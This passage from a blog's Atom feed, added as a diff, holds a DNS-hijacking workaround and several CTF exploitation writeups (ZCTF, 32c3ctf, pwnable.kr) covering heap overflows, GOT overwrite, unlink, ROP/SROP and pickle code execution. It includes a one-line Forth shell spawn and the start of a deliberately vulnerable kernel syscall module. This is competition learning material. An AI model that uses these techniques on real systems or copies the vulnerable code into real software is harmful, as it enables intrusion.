+  &lt;/ol&gt;
+&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2016/04/how-to-set-up-a-duckduckgo-proxy-site-with-nginx/&quot;&gt;如何用 Nginx 搭建简单的 DuckDuckGo 代理站&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on April 09, 2016.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[利用非标准端口 DNS 服务器避免 DNS 劫持]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2016/03/avoid-dns-hijacking-with-non-standard-port-dns/" />
+  <id>https://cubl.in/blog/2016/03/avoid-dns-hijacking-with-non-standard-port-dns</id>
+  <updated>2016-05-15T00:00:00-00:00</updated>
+  <published>2016-03-23T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;GFW的DNS劫持原理: 说起来挺简单,GFW对境外DNS的劫持,是在发现你请求敏感域名的DNS记录时,伪装成你请求的DNS返回一个污染的数据包给你的解析器,但并不会丢弃你向境外DNS的请求,也不会丢弃境外DNS返回的正确解析结果,他只是让错误的数据抢先回来欺骗了你的解析器而已,毕竟他直接从国内给你发污染数据怎么都比国外DNS返回正确数据要快.而解析器在先收到了欺骗数据包之后,就不会再管后面返回的正确数据了,这样你就被 DNS劫持了.&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;很久以前我是用这篇 blog&lt;sup id=&quot;fnref:1:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;提供的方法，就是用 iptables drop 掉 GFW 的假 DNS 解析包。但是 2015 年 GFW 开始采用随机 IP 污染的方式，这种黑名单的解决方案已经不可用了。后来换了 &lt;a href=&quot;https://github.com/jedisct1/dnscrypt-proxy&quot;&gt;dnscrypt-proxy&lt;/a&gt;，还算是比较好用的。但是最近不明原因，dnscrypt-proxy 在使用一段时间之后老是卡住。尝试解决无果，就想办法找替代的方案。&lt;/p&gt;
+
+&lt;p&gt;前几天发现 GFW 没有劫持非标准端口的 DNS 服务器，于是想到了下面两种方法避免劫持。&lt;/p&gt;
+
+&lt;h3 id=&quot;iptables&quot;&gt;iptables&lt;/h3&gt;
+&lt;p&gt;将外网网卡(我这是 enp8s0)发出的 dport 是 53 的包 DNAT 给 OpenDNS 443 端口。&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; enp8s0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 53 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; DNAT &lt;span class=&quot;nt&quot;&gt;--to&lt;/span&gt; 208.67.222.222:443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;dnsmasq&quot;&gt;dnsmasq&lt;/h3&gt;
+&lt;p&gt;以下是采用 OpenDNS 443 端口的示例配置。&lt;/p&gt;
+
+&lt;div class=&quot;language-conf highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;=&lt;span class=&quot;m&quot;&gt;53&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;resolv&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# For IPv6
+# server=2620:0:ccc::2#443
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;=&lt;span class=&quot;m&quot;&gt;208&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;67&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;222&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;222&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#443
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;=&lt;span class=&quot;m&quot;&gt;127&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dnsmasq 的具体使用，可以看 ArchWiki&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;update-2016-05-15&quot;&gt;Update: 2016-05-15&lt;/h4&gt;
+&lt;p&gt;推荐结合 @felixonmars 的 &lt;a href=&quot;https://github.com/felixonmars/dnsmasq-china-list&quot;&gt;dnsmasq-china-list&lt;/a&gt; 使用。&lt;/p&gt;
+
+&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://www.lifetyper.com/2014/06/anti-dns-poison-without-vpn.html&quot;&gt;无需VPN的OpenWRT DNS防污染方法&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt; &lt;a href=&quot;#fnref:1:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://wiki.archlinux.org/index.php/Dnsmasq&quot;&gt;dnsmasq @ ArchWiki&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2016/03/avoid-dns-hijacking-with-non-standard-port-dns/&quot;&gt;利用非标准端口 DNS 服务器避免 DNS 劫持&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on March 23, 2016.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Writeup: ZCTF]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2016/01/writeup-zctf/" />
+  <id>https://cubl.in/blog/2016/01/writeup-zctf</id>
+  <updated>2016-01-28T00:00:00-00:00</updated>
+  <published>2016-01-24T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;blockquote&gt;
+  &lt;p&gt;2016 年第一篇 blog!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;这次只做出两道 pwn, 好忧伤…&lt;/p&gt;
+
+&lt;h2 id=&quot;guess&quot;&gt;guess&lt;/h2&gt;
+
+&lt;p&gt;在最近的 32c3ctf 中出现过一道类似的 readme&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;. 就是把&lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt;改成目的字符串位置，可以在 libc 打出错误信息的时候，被当作文件名打印出来。&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/cbbd4ab5462c2f0f287b&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/cbbd4ab5462c2f0f287b&quot;&gt;cubarco/cbbd4ab5462c2f0f287b&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;note1&quot;&gt;note1&lt;/h2&gt;
+
+&lt;p&gt;这题的 note 是以链表形式储存的，堆溢出（edit 存在溢出漏洞）之后可以覆盖地址更改链表结构。我的 exp 思路就是先把一个 note 指向&lt;code class=&quot;highlighter-rouge&quot;&gt;setvbuf()&lt;/code&gt;的 got, 然后用 show 把地址 leak 出来，这样可以 offset 到&lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;. 然后再将另一个 note 地址改到&lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp()&lt;/code&gt;的 got, 通过 edit 把内容改成&lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;的地址。最后调用&lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp()&lt;/code&gt;, title 填&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;就可以了。&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/30a44a61252f448964c4&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/30a44a61252f448964c4&quot;&gt;cubarco/30a44a61252f448964c4&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;note2&quot;&gt;&lt;del&gt;note2&lt;/del&gt;&lt;/h2&gt;
+
+&lt;p&gt;这题在赛时没找到漏洞，赛后看了 FlappyPig 的 Writeup&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;, 只是简单的 fastbin, 感觉好可惜… 360 安全播报给的代码没缩进根本不能看，自己重新写了个。&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/9752fbbe78a071b04b37&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/9752fbbe78a071b04b37&quot;&gt;cubarco/9752fbbe78a071b04b37&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;note3&quot;&gt;&lt;del&gt;note3&lt;/del&gt;&lt;/h2&gt;
+
+&lt;p&gt;这题同样是没有在赛时做出来，但是与 note2 相反，这题我是找到了两个可以利用的漏洞的(一个是 integer overflow, 另一个是可以增加第八个 note), 但是不知道如何利用。我在比赛的时候一直想着怎么 fastbin, 因为我觉得 unlink 这么古老的 exp 肯定已经不能用了… 没想到这题的环境刚好适合 unlink, 有点可惜。赛后看了 FlappyPig 的 Writeup&lt;sup id=&quot;fnref:2:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;, 自己重新写了个 exp, 也算是复习一下 unlink.&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/ababdac123a4762c0180&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/ababdac123a4762c0180&quot;&gt;cubarco/ababdac123a4762c0180&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200&quot;&gt;write-ups-2015/32c3-ctf-2015/pwn/readme-200/ @ GitHub&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;http://bobao.360.cn/ctf/detail/158.html&quot;&gt;ZCTF Writeup @ 360 安全播报&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt; &lt;a href=&quot;#fnref:2:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2016/01/writeup-zctf/&quot;&gt;Writeup: ZCTF&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on January 24, 2016.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Writeup: 32c3ctf]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/12/writeup-32c3ctf/" />
+  <id>https://cubl.in/blog/2015/12/writeup-32c3ctf</id>
+  <updated>2016-01-24T00:00:00-00:00</updated>
+  <published>2015-12-30T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;h2 id=&quot;forth&quot;&gt;forth&lt;/h2&gt;
+
+&lt;p&gt;forth 直接能跑system&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;。&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;S&quot; sh&quot; system&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;gurke&quot;&gt;gurke&lt;/h2&gt;
+
+&lt;p&gt;pickle 在 unpickle 的时候会执行对象的 &lt;code class=&quot;highlighter-rouge&quot;&gt;__reduce__&lt;/code&gt; 方法&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;。用 eval 把 &lt;code class=&quot;highlighter-rouge&quot;&gt;__main__.flag.flag&lt;/code&gt; 打进 stderr 就行了。&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/e46eb03e1cd06046d130&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/e46eb03e1cd06046d130&quot;&gt;cubarco/e46eb03e1cd06046d130&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;teufel&quot;&gt;teufel&lt;/h2&gt;
+
+&lt;p&gt;这题的 bin 不大，里面的 gadgets 很少，但是给了 libc. 思路就是先 leak 出保存在栈中的 rbp, 然后 offset 到 system。&lt;/p&gt;
+
+&lt;p&gt;这个 offset 要先在本机确定后三位(16 进制), 然后跑个脚本，用 0x1000 的步长去爆破服务器上的 offset. 我的办法是先找&lt;code class=&quot;highlighter-rouge&quot;&gt;__stack_chk_fail&lt;/code&gt;, 原因是这个函数不需要参数就能输出。&lt;/p&gt;
+
+&lt;h6 id=&quot;offsetpy&quot;&gt;offset.py&lt;/h6&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/569fd814a29d8ef988e1&quot; data-gist-file=&quot;32c3ctf-teufel-offset.py&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/569fd814a29d8ef988e1&quot;&gt;cubarco/569fd814a29d8ef988e1&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h6 id=&quot;exppy&quot;&gt;exp.py&lt;/h6&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/569fd814a29d8ef988e1&quot; data-gist-file=&quot;32c3ctf-teufel-exp.py&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/569fd814a29d8ef988e1&quot;&gt;cubarco/569fd814a29d8ef988e1&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;吐槽&quot;&gt;&lt;del&gt;吐槽&lt;/del&gt;&lt;/h2&gt;
+
+&lt;p&gt;&lt;del&gt;readme 的 flag 居然是文件名… &lt;/del&gt;不过&lt;code class=&quot;highlighter-rouge&quot;&gt;LIBC_FATAL_STDERR_&lt;/code&gt;这个环境变量确实是以前没见过的。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;update 2016-01-24:&lt;/strong&gt; 关于 readme 这道题，之前以为 flag 是文件名，做 ZCTF 的 guess 时&lt;sup id=&quot;fnref:3&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;，回来看才发现原来是把&lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt;改掉了，蛮有意思。&lt;/p&gt;
+
+&lt;p&gt;@rickyz 的 sandbox 解法&lt;sup id=&quot;fnref:4&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:4&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;蛮有意思，居然想到争抢修改系统调用参数。直接改&lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/self/mem&lt;/code&gt;来改变程序流也是第一次见。&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;http://rosettacode.org/wiki/Execute_a_system_command#Forth&quot;&gt;Execute a system command#forth&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://docs.python.org/2/library/pickle.html#object.__reduce__&quot;&gt;Pickling and unpickling extension types&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:3&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2016/01/writeup-zctf/&quot;&gt;Writeup: ZCTF&lt;/a&gt; &lt;a href=&quot;#fnref:3&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:4&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://rzhou.org/~ricky/32c3/sandbox/&quot;&gt;Index of /~ricky/32c3/sandbox/&lt;/a&gt; &lt;a href=&quot;#fnref:4&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/12/writeup-32c3ctf/&quot;&gt;Writeup: 32c3ctf&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on December 30, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Writeup-Pwnable: unexploitable]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/12/writeup-pwnable-unexploitable/" />
+  <id>https://cubl.in/blog/2015/12/writeup-pwnable-unexploitable</id>
+  <updated>2015-12-23T00:00:00-00:00</updated>
+  <published>2015-12-23T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;h3 id=&quot;rop&quot;&gt;ROP&lt;/h3&gt;
+
+&lt;p&gt;这题主要就是在 0x400560 藏了一个&lt;code class=&quot;highlighter-rouge&quot;&gt;0F 0A&lt;/code&gt;的 opcode, 对应的 x64 指令是&lt;code class=&quot;highlighter-rouge&quot;&gt;syscall&lt;/code&gt;, 找到这个就好办了。&lt;/p&gt;
+
+&lt;p&gt;然后构造 ROP, 一开始找不到控制 rax 的 gadgets, 搜了一下发现可以利用&lt;code class=&quot;highlighter-rouge&quot;&gt;read()&lt;/code&gt;的返回值。具体的构造就是时间问题了，x64 的 ROP 可以看这篇文章&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;。&lt;/p&gt;
+
+&lt;h6 id=&quot;exp-roppy&quot;&gt;exp-rop.py&lt;/h6&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/23b04edc7e79b1c71547&quot; data-gist-file=&quot;pwnable-hackerssecret-unexploitable-rop.py&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/23b04edc7e79b1c71547&quot;&gt;cubarco/23b04edc7e79b1c71547&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;srop&quot;&gt;SROP&lt;/h3&gt;
+
+&lt;p&gt;结果 flag 里提到 SROP 的解法，我就又写了个 SROP. 简单的 SROP 介绍可以看这篇文章&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;。&lt;/p&gt;
+
+&lt;h6 id=&quot;exp-sroppy&quot;&gt;exp-srop.py&lt;/h6&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/23b04edc7e79b1c71547&quot; data-gist-file=&quot;pwnable-hackerssecret-unexploitable-srop.py&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/23b04edc7e79b1c71547&quot;&gt;cubarco/23b04edc7e79b1c71547&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
+
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;http://drops.wooyun.org/papers/7551&quot;&gt;一步一步学ROP之linux_x64篇&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/network/87447.html&quot;&gt;Sigreturn Oriented Programming (SROP) Attack攻击原理&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2015/12/writeup-pwnable-unexploitable/&quot;&gt;Writeup-Pwnable: unexploitable&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on December 23, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Writeup-Pwnable: syscall]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2015/12/writeup-pwnable-syscall/" />
+  <id>https://cubl.in/blog/2015/12/writeup-pwnable-syscall</id>
+  <published>2015-12-16T00:00:00+00:00</published>
+  <updated>2015-12-16T00:00:00+00:00</updated>
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// adding a new system call : sys_upper&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;linux/module.h&amp;gt;
+#include &amp;lt;linux/kernel.h&amp;gt;
+#include &amp;lt;linux/slab.h&amp;gt;
+#include &amp;lt;linux/vmalloc.h&amp;gt;
+#include &amp;lt;linux/mm.h&amp;gt;
+#include &amp;lt;asm/unistd.h&amp;gt;
+#include &amp;lt;asm/page.h&amp;gt;
+#include &amp;lt;linux/syscalls.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
+#define NR_SYS_UNUSED		223
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;//Pointers to re-mapped writable pages&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;asmlinkage&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sys_upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
